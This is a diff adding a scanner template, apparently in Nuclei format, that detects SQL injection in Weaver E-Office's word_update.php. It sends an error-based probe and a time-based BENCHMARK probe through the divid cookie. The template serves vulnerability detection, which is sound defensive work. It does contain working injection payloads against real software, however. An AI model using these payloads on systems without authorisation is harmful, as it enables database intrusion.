@@ -1,0 +1,45 @@
+id: weaver-e-office-word-update-sqli
+info:
+  name: Weaver E-Office Word Update SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(3,7)}}"
+  t2: "{{to_number(t1) + 3}}"
+
+http:
+  - raw:
+      - |
+        GET /general/system/interface/loginedit/word_update.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: divid=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "supplied argument is not a valid MySQL result resource in"
+
+  - raw:
+      - |
+        GET /general/system/interface/loginedit/word_update.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: divid=1 AND 3742=BENCHMARK({{t1}}000000,MD5(0x496c624d));wordcolor=5;content=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
